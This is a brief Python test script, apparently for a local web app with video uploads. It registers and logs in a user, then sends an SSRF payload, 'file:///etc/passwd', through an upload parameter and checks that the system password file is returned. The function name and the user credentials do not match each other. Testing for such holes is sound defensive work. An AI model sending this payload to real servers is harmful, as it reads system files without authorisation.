import requests

#Test case for command execution
def test_CommandExec():
    #Create User
    resp = requests.post("https://localhost/register", data={"username": "test_ssrf", "password": "ssrf_password", "confirmpassword": "ssrf_password"}, verify=False)
    
    # Login as valid user -- True
    s = requests.session()
    resp = s.post("https://localhost/login", data={"username": "test_exec", "password": "exec_password"}, verify=False)

    # Check to see if login was successful by hitting main page
    resp = s.get("https://localhost/", verify=False)
    assert "Videos" in resp.text
    
    #Check to see if SSRF was successful
    resp = s.get("https://localhost/upload?content=file:///etc/passwd", verify=False)
    assert "root" in resp.text
